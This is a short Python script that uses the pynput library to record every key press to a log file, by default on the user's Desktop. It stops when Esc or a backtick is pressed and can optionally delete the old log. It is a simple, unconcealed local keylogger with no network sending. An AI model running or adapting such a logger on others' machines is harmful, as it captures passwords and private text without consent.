import os
from pynput import keyboard


# Determine log file location
log_file = os.getenv('pylogger_file', os.path.expanduser('~/Desktop/file.log'))

# Determine the cancel key (default is '`')
cancel_key = os.getenv('pylogger_cancel', '`')

# Remove the log file if 'pylogger_clean' environment variable is set
if os.getenv('pylogger_clean'):
    try:
        os.remove(log_file)
    except FileNotFoundError:
        pass


# Function to handle key press events
def on_key_press(key):
    try:
        with open(log_file, 'a') as f:
            f.write(f'{key}\n')

        # Check if the pressed key is the cancel key or ESC key
        if key == keyboard.Key.esc or (hasattr(key, 'char') and key.char == cancel_key):
            return False

    except AttributeError:
        with open(log_file, 'a') as f:
            f.write(f'Special key pressed: {key}\n')

# Listener setup
try:
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

except Exception as ex:
    with open(log_file, 'a') as f:
        f.write(f'Error: {ex}\n')
